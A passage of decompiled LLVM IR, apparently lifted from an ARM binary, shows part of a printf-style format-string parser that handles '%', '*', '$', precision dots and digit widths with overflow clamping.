  %v3_12d0c.pre-phi = phi i32 [ %.pre, %.dec_label_pc_12cd8_crit_edge ], [ %v2_12ca0, %dec_label_pc_12ccc ]
  %v0_12d0464 = phi i32 [ %v3_12c88, %.dec_label_pc_12cd8_crit_edge ], [ %v2_12cd4, %dec_label_pc_12ccc ]
  %v0_12ce4 = phi i32 [ ptrtoint (i32* @global_var_1f010.69 to i32), %.dec_label_pc_12cd8_crit_edge ], [ %v0_12ce4.pre, %dec_label_pc_12ccc ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 140, i32* %r2.global-to-local, align 4
  %v2_12ce4 = add i32 %v0_12ce4, -37028
  store i32 %v2_12ce4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v4_12cf8 = inttoptr i32 %v2_12ce4 to i8*
  store i8* %v4_12cf8, i8** %stack_var_-120, align 4
  br label %dec_label_pc_12d04

dec_label_pc_12d00:                               ; preds = %.thread20, %dec_label_pc_12e34
  %v0_12d00 = phi i32 [ %v2_12eac, %.thread20 ], [ %v0_12e1076, %dec_label_pc_12e34 ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread20 ], [ %stack_var_-44.2, %dec_label_pc_12e34 ]
  store i32 %v0_12d00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12d04

dec_label_pc_12d04:                               ; preds = %dec_label_pc_12cd8, %dec_label_pc_12d00
  %v1_12d18 = phi i32 [ %v0_12d0464, %dec_label_pc_12cd8 ], [ %v0_12d00, %dec_label_pc_12d00 ]
  %stack_var_-44.1 = phi i32 [ %tmp117, %dec_label_pc_12cd8 ], [ %stack_var_-44.0, %dec_label_pc_12d00 ]
  %v1_12d04 = inttoptr i32 %v1_12d18 to i8*
  %v2_12d04 = load i8, i8* %v1_12d04, align 1
  %v3_12d04 = zext i8 %v2_12d04 to i32
  store i32 %v3_12d04, i32* %r3.global-to-local, align 4
  %v7_12d08 = icmp eq i8 %v2_12d04, 42
  br i1 %v7_12d08, label %bb, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12d04
  store i32 %v1_12d18, i32* %r6.global-to-local, align 4
  %v0_12d1c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12d1c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12d64.preheader

bb:                                               ; preds = %dec_label_pc_12d04
  %v1_12d10 = load i32, i32* %r8.global-to-local, align 4
  %v2_12d10 = load i32, i32* %sb.global-to-local, align 4
  %v4_12d10 = mul i32 %v2_12d10, %v1_12d10
  %v5_12d10 = add i32 %v4_12d10, %v3_12d0c.pre-phi
  store i32 %v5_12d10, i32* %r3.global-to-local, align 4
  %v2_12d18 = add i32 %v1_12d18, 1
  store i32 %v2_12d18, i32* %r6.global-to-local, align 4
  %v0_12d1c111 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12d1c111, i32* %r1.global-to-local, align 4
  %v3_12d20 = add i32 %v5_12d10, -40
  %v4_12d20 = inttoptr i32 %v3_12d20 to i32*
  store i32 %v0_12d1c111, i32* %v4_12d20, align 4
  %v0_12d68.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12d64.preheader

dec_label_pc_12d64.preheader:                     ; preds = %.thread8, %bb
  %v0_12d68.pre = phi i32 [ %v1_12d18, %.thread8 ], [ %v0_12d68.pre.pre, %bb ]
  %v0_12d6c.pre = load i32, i32* @lr, align 4
  %v2_12d6c = add i32 %v0_12d6c.pre, 140
  %v3_12d6c = inttoptr i32 %v2_12d6c to i32*
  br label %dec_label_pc_12d64

dec_label_pc_12d28:                               ; preds = %dec_label_pc_12d64
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_12d2c = load i32, i32* %r1.global-to-local, align 4
  %v2_12d2c = add i32 %v0_12d2c, -214748363
  %tmp139 = sub i32 214748362, %v0_12d2c
  %v6_12d2c = and i32 %tmp139, %v0_12d2c
  %v7_12d2c = icmp slt i32 %v6_12d2c, 0
  %v8_12d2c = icmp slt i32 %v2_12d2c, 0
  %v9_12d2c = icmp eq i32 %v0_12d2c, 214748363
  %v3_12d30 = xor i1 %v8_12d2c, %v7_12d2c
  %v4_12d30 = or i1 %v9_12d2c, %v3_12d30
  br i1 %v4_12d30, label %dec_label_pc_12d48, label %dec_label_pc_12d34

dec_label_pc_12d34:                               ; preds = %dec_label_pc_12d28
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_12d38 = icmp eq i32 %v0_12d2c, 214748364
  br i1 %v9_12d38, label %dec_label_pc_12d40, label %dec_label_pc_12d60

dec_label_pc_12d40:                               ; preds = %dec_label_pc_12d34
  %v8_12d44 = icmp ugt i8 %v2_12d68, 55
  br i1 %v8_12d44, label %dec_label_pc_12d60, label %dec_label_pc_12d48

dec_label_pc_12d48:                               ; preds = %dec_label_pc_12d40, %dec_label_pc_12d28
  %v2_12d4c = mul i32 %v0_12d2c, 10
  %v1_12d50 = add i32 %v2_12d4c, -48
  store i32 %v1_12d50, i32* %r3.global-to-local, align 4
  %v2_12d54 = add i32 %v1_12d50, %v3_12d68
  br label %dec_label_pc_12d60

dec_label_pc_12d60:                               ; preds = %dec_label_pc_12d40, %dec_label_pc_12d34, %dec_label_pc_12d48
  %storemerge = phi i32 [ %v2_12d54, %dec_label_pc_12d48 ], [ 2147483647, %dec_label_pc_12d34 ], [ 2147483647, %dec_label_pc_12d40 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_12d60 = add i32 %v0_12de8, 1
  store i32 %v1_12d60, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12d64

dec_label_pc_12d64:                               ; preds = %dec_label_pc_12d64.preheader, %dec_label_pc_12d60
  %v0_12de8 = phi i32 [ %v0_12d68.pre, %dec_label_pc_12d64.preheader ], [ %v1_12d60, %dec_label_pc_12d60 ]
  store i32 140, i32* %r2.global-to-local, align 4
  %v1_12d68 = inttoptr i32 %v0_12de8 to i8*
  %v2_12d68 = load i8, i8* %v1_12d68, align 1
  %v3_12d68 = zext i8 %v2_12d68 to i32
  store i32 %v3_12d68, i32* @ip, align 4
  %v4_12d6c = load i32, i32* %v3_12d6c, align 4
  store i32 %v4_12d6c, i32* %r3.global-to-local, align 4
  %v2_12d70 = mul nuw nsw i32 %v3_12d68, 2
  store i32 %v2_12d70, i32* %r2.global-to-local, align 4
  %v2_12d74 = add i32 %v2_12d70, %v4_12d6c
  %v3_12d74 = inttoptr i32 %v2_12d74 to i16*
  %v4_12d74 = load i16, i16* %v3_12d74, align 2
  %v6_12d74 = zext i16 %v4_12d74 to i32
  store i32 %v6_12d74, i32* %r3.global-to-local, align 4
  %v1_12d78 = and i32 %v6_12d74, 8
  %v2_12d78 = icmp eq i32 %v1_12d78, 0
  br i1 %v2_12d78, label %dec_label_pc_12d80, label %dec_label_pc_12d28

dec_label_pc_12d80:                               ; preds = %dec_label_pc_12d64
  %v0_12d80 = load i32, i32* %r0.global-to-local, align 4
  %v1_12d80 = add i32 %v0_12d80, -1
  %v2_12d80 = inttoptr i32 %v1_12d80 to i8*
  %v3_12d80 = load i8, i8* %v2_12d80, align 1
  %v4_12d80 = zext i8 %v3_12d80 to i32
  store i32 %v4_12d80, i32* %r3.global-to-local, align 4
  %v7_12d84 = icmp eq i8 %v3_12d80, 37
  br i1 %v7_12d84, label %dec_label_pc_12d8c, label %dec_label_pc_12e4c

dec_label_pc_12d8c:                               ; preds = %dec_label_pc_12d80
  %v7_12d8c = icmp eq i8 %v2_12d68, 36
  %. = zext i1 %v7_12d8c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_12d98 = load i32, i32* %r1.global-to-local, align 4
  %tmp143 = icmp slt i32 %v0_12d98, 1
  br i1 %tmp143, label %bb144, label %thread-pre-split

bb144:                                            ; preds = %dec_label_pc_12d8c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_12d8c, %bb144
  %v0_12da0 = phi i32 [ 0, %bb144 ], [ %., %dec_label_pc_12d8c ]
  %v2_12da0 = icmp eq i32 %v0_12da0, 0
  %v0_12dd4 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_12da0, label %dec_label_pc_12dd4, label %dec_label_pc_12da8

dec_label_pc_12da8:                               ; preds = %thread-pre-split
  %v2_12dd4 = icmp eq i32 %v0_12dd4, 0
  %v1_12dac = add i32 %v0_12de8, 1
  store i32 %v1_12dac, i32* %r0.global-to-local, align 4
  br i1 %v2_12dd4, label %dec_label_pc_13180, label %dec_label_pc_12db4

dec_label_pc_12db4:                               ; preds = %dec_label_pc_12da8
  %v2_12db4 = sub i32 %v0_12d98, %v0_12dd4
  %v4_12db4 = xor i32 %v0_12dd4, %v0_12d98
  %v5_12db4 = xor i32 %v2_12db4, %v0_12d98
  %v6_12db4 = and i32 %v5_12db4, %v4_12db4
  %v7_12db4 = icmp slt i32 %v6_12db4, 0
  %v8_12db4 = icmp slt i32 %v2_12db4, 0
  %v9_12db4 = icmp eq i32 %v0_12d98, %v0_12dd4
  %v3_12db8 = xor i1 %v8_12db4, %v7_12db4
  %v4_12db8 = or i1 %v9_12db4, %v3_12db8
  br i1 %v4_12db8, label %dec_label_pc_12dc8, label %bb145

bb145:                                            ; preds = %dec_label_pc_12db4
  store i32 %v0_12d98, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_12dc8

dec_label_pc_12dc4:                               ; preds = %dec_label_pc_12de8, %dec_label_pc_12df0
  %v0_12dc4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12dc4, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_12dc8

dec_label_pc_12dc8:                               ; preds = %bb145, %dec_label_pc_12db4, %dec_label_pc_12dc4
  %v0_12dc8 = phi i32 [ %v0_12d80, %dec_label_pc_12dc4 ], [ %v1_12dac, %dec_label_pc_12db4 ], [ %v1_12dac, %bb145 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_12dc4 ], [ %v0_12d98, %dec_label_pc_12db4 ], [ %v0_12d98, %bb145 ]
  store i32 %v0_12dc8, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_12e04.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_12e04 = ptrtoint i8* %v2_12e04.pre to i32
  br label %dec_label_pc_12e04

dec_label_pc_12dd4:                               ; preds = %thread-pre-split
  %tmp146 = icmp slt i32 %v0_12dd4, 1
  br i1 %tmp146, label %dec_label_pc_12de8, label %dec_label_pc_12ddc

dec_label_pc_12ddc:                               ; preds = %dec_label_pc_12dd4
  %v7_12ddc = icmp eq i8 %v2_12d68, 109
  br i1 %v7_12ddc, label %dec_label_pc_12e4c, label %dec_label_pc_13180

dec_label_pc_12de8:                               ; preds = %dec_label_pc_12dd4
  %tmp183 = icmp ugt i32 %v0_12de8, %v0_12d80
  br i1 %tmp183, label %dec_label_pc_12df0, label %dec_label_pc_12dc4

dec_label_pc_12df0:                               ; preds = %dec_label_pc_12de8
  %v1_12df0 = inttoptr i32 %v0_12d80 to i8*
  %v2_12df0 = load i8, i8* %v1_12df0, align 1
  %v3_12df0 = zext i8 %v2_12df0 to i32
  store i32 %v3_12df0, i32* %r3.global-to-local, align 4
  %v7_12df4 = icmp eq i8 %v2_12df0, 48
  br i1 %v7_12df4, label %dec_label_pc_12dc4, label %bb147

bb147:                                            ; preds = %dec_label_pc_12df0
  %v1_12df8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_12df8, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_12e4c

dec_label_pc_12e04.loopexit:                      ; preds = %dec_label_pc_12e0c
  %v1_12e18 = load i32, i32* @r4, align 4
  %v3_12e18 = or i32 %v1_12e18, %v0_12e2c
  store i32 %v3_12e18, i32* @r4, align 4
  %v2_12e1c = add i32 %v0_12e1076, 1
  store i32 %v2_12e1c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12e04

dec_label_pc_12e04:                               ; preds = %dec_label_pc_12e04.loopexit, %dec_label_pc_12dc8
  %v0_12e1076 = phi i32 [ %v2_12e1c, %dec_label_pc_12e04.loopexit ], [ %v0_12dc8, %dec_label_pc_12dc8 ]
  store i32 %v3_12e04, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_12e10 = inttoptr i32 %v0_12e1076 to i8*
  br label %dec_label_pc_12e0c

dec_label_pc_12e0c:                               ; preds = %dec_label_pc_12e24, %dec_label_pc_12e04
  %v0_12e2c = phi i32 [ %v2_12e2c, %dec_label_pc_12e24 ], [ 1, %dec_label_pc_12e04 ]
  %v0_12e0c = phi i32 [ %v5_12e0c, %dec_label_pc_12e24 ], [ %v3_12e04, %dec_label_pc_12e04 ]
  %v1_12e0c = inttoptr i32 %v0_12e0c to i8*
  %v2_12e0c = load i8, i8* %v1_12e0c, align 1
  %v3_12e0c = zext i8 %v2_12e0c to i32
  store i32 %v3_12e0c, i32* %r2.global-to-local, align 4
  %v5_12e0c = add i32 %v0_12e0c, 1
  store i32 %v5_12e0c, i32* %r0.global-to-local, align 4
  %v2_12e10 = load i8, i8* %v1_12e10, align 1
  %v3_12e10 = zext i8 %v2_12e10 to i32
  store i32 %v3_12e10, i32* %r3.global-to-local, align 4
  %v9_12e14 = icmp eq i8 %v2_12e10, %v2_12e0c
  br i1 %v9_12e14, label %dec_label_pc_12e04.loopexit, label %dec_label_pc_12e24

dec_label_pc_12e24:                               ; preds = %dec_label_pc_12e0c
  %v1_12e24 = inttoptr i32 %v5_12e0c to i8*
  %v2_12e24 = load i8, i8* %v1_12e24, align 1
  %v3_12e24 = zext i8 %v2_12e24 to i32
  store i32 %v3_12e24, i32* %r3.global-to-local, align 4
  %v2_12e28 = icmp eq i8 %v2_12e24, 0
  %v2_12e2c = mul i32 %v0_12e2c, 2
  store i32 %v2_12e2c, i32* %r1.global-to-local, align 4
  br i1 %v2_12e28, label %dec_label_pc_12e34, label %dec_label_pc_12e0c

dec_label_pc_12e34:                               ; preds = %dec_label_pc_12e24
  %v1_12e34 = add i32 %v0_12e1076, -1
  %v2_12e34 = inttoptr i32 %v1_12e34 to i8*
  %v3_12e34 = load i8, i8* %v2_12e34, align 1
  %v7_12e38 = icmp eq i8 %v3_12e34, 37
  %v0_12e3c = load i32, i32* @r4, align 4
  %v1_12e3c = and i32 %v0_12e3c, 10
  store i32 %v1_12e3c, i32* %r3.global-to-local, align 4
  %v4_12e40 = udiv i32 %v1_12e3c, 2
  %v5_12e40 = sub nuw nsw i32 -1, %v4_12e40
  %v6_12e40 = and i32 %v0_12e3c, %v5_12e40
  store i32 %v6_12e40, i32* @r4, align 4
  br i1 %v7_12e38, label %dec_label_pc_12e48, label %dec_label_pc_12d00

dec_label_pc_12e48:                               ; preds = %dec_label_pc_12e34
  %v0_12e48 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12e48, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12e4c

dec_label_pc_12e4c:                               ; preds = %bb147, %dec_label_pc_12d80, %dec_label_pc_12ddc, %dec_label_pc_12e48
  %v1_12e8c = phi i32 [ %v0_12e1076, %dec_label_pc_12e48 ], [ %v0_12de8, %bb147 ], [ %v0_12de8, %dec_label_pc_12ddc ], [ %v0_12de8, %dec_label_pc_12d80 ]
  %v0_12e88 = phi i32 [ %v5_12e0c, %dec_label_pc_12e48 ], [ %v0_12d80, %bb147 ], [ %v0_12d80, %dec_label_pc_12ddc ], [ %v0_12d80, %dec_label_pc_12d80 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_12e48 ], [ %stack_var_-44.1, %bb147 ], [ %stack_var_-44.1, %dec_label_pc_12ddc ], [ %stack_var_-44.1, %dec_label_pc_12d80 ]
  %v1_12e4c = inttoptr i32 %v0_12e88 to i8*
  %v2_12e4c = load i8, i8* %v1_12e4c, align 1
  %v3_12e4c = zext i8 %v2_12e4c to i32
  store i32 %v3_12e4c, i32* %r3.global-to-local, align 4
  %v7_12e50 = icmp eq i8 %v2_12e4c, 42
  br i1 %v7_12e50, label %dec_label_pc_12e58, label %dec_label_pc_12e98

dec_label_pc_12e58:                               ; preds = %dec_label_pc_12e4c
  %v0_12e58 = load i32, i32* %fp.global-to-local, align 4
  %v2_12e58 = icmp eq i32 %v0_12e58, 0
  br i1 %v2_12e58, label %dec_label_pc_12e88, label %dec_label_pc_12e60

dec_label_pc_12e60:                               ; preds = %dec_label_pc_12e58
  %v1_12e60 = inttoptr i32 %v1_12e8c to i8*
  %v2_12e60 = load i8, i8* %v1_12e60, align 1
  %v3_12e60 = zext i8 %v2_12e60 to i32
  store i32 %v3_12e60, i32* %r3.global-to-local, align 4
  %v7_12e64 = icmp eq i8 %v2_12e60, 36
  br i1 %v7_12e64, label %dec_label_pc_12e6c, label %dec_label_pc_13180

dec_label_pc_12e6c:                               ; preds = %dec_label_pc_12e60
  %v0_12e6c = load i32, i32* %r1.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_12e6c, 1
  br i1 %tmp148, label %dec_label_pc_13180, label %dec_label_pc_12e74

dec_label_pc_12e74:                               ; preds = %dec_label_pc_12e6c
  %v0_12e78 = load i32, i32* %r8.global-to-local, align 4
  %v1_12e78 = load i32, i32* %sb.global-to-local, align 4
  %v3_12e78 = mul i32 %v1_12e78, %v0_12e78
  %v4_12e78 = add i32 %v3_12e78, %v3_12d0c.pre-phi
  store i32 %v4_12e78, i32* %r3.global-to-local, align 4
  %v1_12e7c = add i32 %v1_12e8c, 1
  store i32 %v1_12e7c, i32* %r6.global-to-local, align 4
  %v2_12e80 = add i32 %v4_12e78, -12
  %v3_12e80 = inttoptr i32 %v2_12e80 to i32*
  store i32 %v0_12e6c, i32* %v3_12e80, align 4
  br label %dec_label_pc_12e94

dec_label_pc_12e88:                               ; preds = %dec_label_pc_12e58
  %v1_12e88 = add i32 %v0_12e88, 1
  store i32 %v1_12e88, i32* %r3.global-to-local, align 4
  %v9_12e8c = icmp eq i32 %v1_12e88, %v1_12e8c
  br i1 %v9_12e8c, label %dec_label_pc_12e94, label %dec_label_pc_13180

dec_label_pc_12e94:                               ; preds = %dec_label_pc_12e88, %dec_label_pc_12e74
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12e98

dec_label_pc_12e98:                               ; preds = %dec_label_pc_12e4c, %dec_label_pc_12e94
  %v0_12e98 = load i32, i32* %r8.global-to-local, align 4
  %v2_12e98 = icmp eq i32 %v0_12e98, 0
  br i1 %v2_12e98, label %dec_label_pc_12ea4, label %dec_label_pc_12ec4.loopexit

dec_label_pc_12ea4:                               ; preds = %dec_label_pc_12e98
  %v0_12ea4 = load i32, i32* %r6.global-to-local, align 4
  %v1_12ea4 = inttoptr i32 %v0_12ea4 to i8*
  %v2_12ea4 = load i8, i8* %v1_12ea4, align 1
  %v3_12ea4 = zext i8 %v2_12ea4 to i32
  store i32 %v3_12ea4, i32* %r3.global-to-local, align 4
  %v7_12ea8 = icmp eq i8 %v2_12ea4, 46
  br i1 %v7_12ea8, label %.thread20, label %dec_label_pc_12ebc

.thread20:                                        ; preds = %dec_label_pc_12ea4
  %v2_12eac = add i32 %v0_12ea4, 1
  store i32 %v2_12eac, i32* %r6.global-to-local, align 4
  %v1_12eb0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_12eb0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12d00

dec_label_pc_12ebc:                               ; preds = %dec_label_pc_12ea4
  %v0_12ebc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12ebc, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_12ec4

dec_label_pc_12ec4.loopexit:                      ; preds = %dec_label_pc_12e98
  %v1_12e9c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_12e9c, i32* @r5, align 4
  %v0_12ed0.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12ec4

dec_label_pc_12ec4:                               ; preds = %dec_label_pc_12ec4.loopexit, %dec_label_pc_12ebc
  %v0_12ed0.pre = phi i32 [ %v0_12ed0.pre.pre, %dec_label_pc_12ec4.loopexit ], [ %v0_12ea4, %dec_label_pc_12ebc ]
  store i32 -37152, i32* %r3.global-to-local, align 4
  %v0_12ec8 = load i32, i32* @lr, align 4
  %v2_12ec8 = add i32 %v0_12ec8, -37152
  store i32 %v2_12ec8, i32* %r1.global-to-local, align 4
  %v1_12ed0 = inttoptr i32 %v0_12ed0.pre to i8*
  br label %dec_label_pc_12ecc

dec_label_pc_12ecc:                               ; preds = %dec_label_pc_12ee0, %dec_label_pc_12ec4
  %v0_12ee0 = phi i32 [ %v1_12ee0, %dec_label_pc_12ee0 ], [ %v2_12ec8, %dec_label_pc_12ec4 ]
  %v1_12ecc = inttoptr i32 %v0_12ee0 to i8*
  %v2_12ecc = load i8, i8* %v1_12ecc, align 1
  %v3_12ecc = zext i8 %v2_12ecc to i32
  store i32 %v3_12ecc, i32* %r2.global-to-local, align 4
  %v2_12ed0 = load i8, i8* %v1_12ed0, align 1
  %v3_12ed0 = zext i8 %v2_12ed0 to i32
  store i32 %v3_12ed0, i32* %r3.global-to-local, align 4
  %v9_12ed4 = icmp eq i8 %v2_12ed0, %v2_12ecc
  br i1 %v9_12ed4, label %bb149, label %dec_label_pc_12ee0

bb149:                                            ; preds = %dec_label_pc_12ecc
  %v2_12ed8 = add i32 %v0_12ed0.pre, 1
  store i32 %v2_12ed8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12eec

dec_label_pc_12ee0:                               ; preds = %dec_label_pc_12ecc
  %v1_12ee0 = add i32 %v0_12ee0, 1
  %v2_12ee0 = inttoptr i32 %v1_12ee0 to i8*
  %v3_12ee0 = load i8, i8* %v2_12ee0, align 1
  %v4_12ee0 = zext i8 %v3_12ee0 to i32
  store i32 %v4_12ee0, i32* %r3.global-to-local, align 4
  store i32 %v1_12ee0, i32* %r1.global-to-local, align 4
  %v2_12ee4 = icmp eq i8 %v3_12ee0, 0
  br i1 %v2_12ee4, label %dec_label_pc_12eec, label %dec_label_pc_12ecc

dec_label_pc_12eec:                               ; preds = %dec_label_pc_12ee0, %bb149
  %v1_12f10 = phi i32 [ %v2_12ed8, %bb149 ], [ %v0_12ed0.pre, %dec_label_pc_12ee0 ]
  %v1_12f0c = phi i32 [ %v0_12ee0, %bb149 ], [ %v1_12ee0, %dec_label_pc_12ee0 ]
  %v2_12ef4 = sub i32 %v1_12f0c, %v2_12ec8
  store i32 %v2_12ef4, i32* %r3.global-to-local, align 4
  %v8_12efc = icmp sgt i32 %v2_12ef4, 1
  br i1 %v8_12efc, label %.thread24, label %dec_label_pc_12f00

dec_label_pc_12f00:                               ; preds = %dec_label_pc_12eec
  %v1_12f00 = inttoptr i32 %v1_12f10 to i8*
  %v2_12f00 = load i8, i8* %v1_12f00, align 1
  %v3_12f00 = zext i8 %v2_12f00 to i32
  store i32 %v3_12f00, i32* %r2.global-to-local, align 4
  %v1_12f04 = inttoptr i32 %v1_12f0c to i8*
  %v2_12f04 = load i8, i8* %v1_12f04, align 1
  %v3_12f04 = zext i8 %v2_12f04 to i32
  store i32 %v3_12f04, i32* %r3.global-to-local, align 4
  %v9_12f08 = icmp eq i8 %v2_12f00, %v2_12f04
  br i1 %v9_12f08, label %bb150, label %.thread24

bb150:                                            ; preds = %dec_label_pc_12f00
  %v2_12f0c = add i32 %v1_12f0c, 9
  store i32 %v2_12f0c, i32* %r1.global-to-local, align 4
  %v2_12f10 = add i32 %v1_12f10, 1
  store i32 %v2_12f10, i32* %r6.global-to-local, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_12f00, %dec_label_pc_12eec, %bb150
  %v0_12f18 = phi i32 [ %v1_12f0c, %dec_label_pc_12f00 ], [ %v1_12f0c, %dec_label_pc_12eec ], [ %v2_12f0c, %bb150 ]
  %v0_12f14 = phi i32 [ %v1_12f10, %dec_label_pc_12f00 ], [ %v1_12f10, %dec_label_pc_12eec ], [ %v2_12f10, %bb150 ]
  %v1_12f14 = inttoptr i32 %v0_12f14 to i8*
  %v2_12f14 = load i8, i8* %v1_12f14, align 1
  %v3_12f14 = zext i8 %v2_12f14 to i32
  store i32 %v3_12f14, i32* %r2.global-to-local, align 4
  %v1_12f18 = add i32 %v0_12f18, 9
  %v2_12f18 = inttoptr i32 %v1_12f18 to i8*
  %v3_12f18 = load i8, i8* %v2_12f18, align 1
  %v4_12f18 = zext i8 %v3_12f18 to i32
  store i32 %v4_12f18, i32* %r3.global-to-local, align 4
  %v2_12f1c = icmp eq i8 %v2_12f14, 0
  %v3_12f20 = mul nuw nsw i32 %v4_12f18, 256
  store i32 %v3_12f20, i32* @ip, align 4
  br i1 %v2_12f1c, label %dec_label_pc_13180, label %dec_label_pc_12f28

dec_label_pc_12f28:                               ; preds = %.thread24
  store i32 -37052, i32* %r3.global-to-local, align 4
  %v2_12f2c = add i32 %v0_12ec8, -37052
  store i32 %v2_12f2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f30

dec_label_pc_12f30:                               ; preds = %dec_label_pc_12fb4, %dec_label_pc_12f28
  %v1_12f44 = phi i32 [ %v1_12fb4, %dec_label_pc_12fb4 ], [ %v2_12f2c, %dec_label_pc_12f28 ]
  %v1_12f30 = inttoptr i32 %v1_12f44 to i8*
  %v2_12f30 = load i8, i8* %v1_12f30, align 1
  %v3_12f30 = zext i8 %v2_12f30 to i32
  store i32 %v3_12f30, i32* %r3.global-to-local, align 4
  %v9_12f34 = icmp eq i8 %v2_12f30, %v2_12f14
  br i1 %v9_12f34, label %dec_label_pc_12f3c, label %dec_label_pc_12fb4

dec_label_pc_12f3c:                               ; preds = %dec_label_pc_12f30
  store i32 %v2_12f2c, i32* %r3.global-to-local, align 4
  %v2_12f44 = sub i32 %v1_12f44, %v2_12f2c
  store i32 %v2_12f44, i32* %r1.global-to-local, align 4
  %v7_12f4c = icmp slt i32 %v2_12f44, 18
  br i1 %v7_12f4c, label %bb152, label %dec_label_pc_12f50

dec_label_pc_12f50:                               ; preds = %dec_label_pc_12f3c
  %v1_12f50 = and i32 %v3_12f20, 1024
  %v2_12f50 = icmp eq i32 %v1_12f50, 0
  br i1 %v2_12f50, label %bb152, label %bb151

bb151:                                            ; preds = %dec_label_pc_12f50
  %v2_12f54 = add i32 %v2_12f44, -2
  store i32 %v2_12f54, i32* %r1.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_12f3c, %dec_label_pc_12f50, %bb151
  %v0_12f5c = phi i32 [ %v2_12f44, %dec_label_pc_12f3c ], [ %v2_12f44, %dec_label_pc_12f50 ], [ %v2_12f54, %bb151 ]
  store i32 -37100, i32* %r3.global-to-local, align 4
  %v1_12f5c = load i32, i32* %r7.global-to-local, align 4
  %v2_12f5c = add i32 %v1_12f5c, 32
  %v3_12f5c = inttoptr i32 %v2_12f5c to i32*
  store i32 %v0_12f5c, i32* %v3_12f5c, align 4
  %v0_12f60 = load i32, i32* @lr, align 4
  %v1_12f60 = load i32, i32* %r3.global-to-local, align 4
  %v2_12f60 = add i32 %v1_12f60, %v0_12f60
  store i32 %v2_12f60, i32* %r3.global-to-local, align 4
  %v1_12f64 = add i32 %v2_12f60, -1
  store i32 %v1_12f64, i32* %r0.global-to-local, align 4
  %v0_12f6c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12f68

dec_label_pc_12f68:                               ; preds = %dec_label_pc_12f68, %bb152
  %v0_12f68 = phi i32 [ %v1_12f68, %dec_label_pc_12f68 ], [ %v1_12f64, %bb152 ]
  %v1_12f68 = add i32 %v0_12f68, 1
  %v2_12f68 = inttoptr i32 %v1_12f68 to i8*
  %v3_12f68 = load i8, i8* %v2_12f68, align 1
  %v4_12f68 = zext i8 %v3_12f68 to i32
  store i32 %v4_12f68, i32* %r3.global-to-local, align 4
  store i32 %v1_12f68, i32* %r0.global-to-local, align 4
  %v8_12f70 = icmp sgt i32 %v0_12f6c.pre, %v4_12f68
  br i1 %v8_12f70, label %dec_label_pc_12f68, label %dec_label_pc_12f74

dec_label_pc_12f74:                               ; preds = %dec_label_pc_12f68
  %v2_12f7c.neg = sub i32 37100, %v0_12f60
  %v2_12f80 = add i32 %v2_12f7c.neg, %v1_12f68
  %v2_12f84 = mul i32 %v2_12f80, 2
  store i32 %v2_12f84, i32* %r2.global-to-local, align 4
  %v2_12f88 = add i32 %v0_12f60, -37116
  store i32 %v2_12f88, i32* %r3.global-to-local, align 4
  %v2_12f8c = add i32 %v2_12f84, %v2_12f88
  %v3_12f8c = inttoptr i32 %v2_12f8c to i16*
  %v4_12f8c = load i16, i16* %v3_12f8c, align 2
  %v6_12f8c = sext i16 %v4_12f8c to i32
  store i32 %v6_12f8c, i32* %r1.global-to-local, align 4
  %v2_12f94 = add i32 %v0_12f60, -37132
  store i32 %v2_12f94, i32* %r3.global-to-local, align 4
  %v2_12f98 = add i32 %v2_12f84, %v2_12f94
  %v3_12f98 = inttoptr i32 %v2_12f98 to i16*
  %v4_12f98 = load i16, i16* %v3_12f98, align 2
  %v6_12f98 = sext i16 %v4_12f98 to i32
  %v1_12f9c = load i32, i32* @ip, align 4
  %v2_12f9c = or i32 %v1_12f9c, %v6_12f8c
  %v2_12fa0 = and i32 %v2_12f9c, %v6_12f98
  store i32 %v2_12fa0, i32* %r1.global-to-local, align 4
  store i32 -37052, i32* %r3.global-to-local, align 4
  %v2_12fa8 = add i32 %v0_12f60, -37052
